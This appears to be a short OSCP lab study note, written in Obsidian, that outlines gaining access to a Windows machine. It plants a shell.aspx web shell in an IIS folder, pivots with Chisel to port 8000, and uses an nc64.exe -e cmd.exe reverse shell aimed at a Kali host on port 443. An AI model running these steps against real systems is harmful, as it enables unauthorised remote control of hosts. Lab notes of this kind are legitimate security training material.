check C:\

Check for unconventional folders

Check who is apart of the group
```
icacls development
```

inetput executes aspx files

```
locate shell.aspx
```

Place file shell.aspx into C:\inetpub\development

Chisel pivot to access port 8000

Visit localhost:8000 webpage

localhost:8000/shellaspx will show shell

[[Netcat.exe]]

To get reverse shell

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `\\\inetpub\\\development\\nc64.exe -e cmd.exe ${KaliIP} 443`;

dv.paragraph("```bash\n" + command + "\n```");
```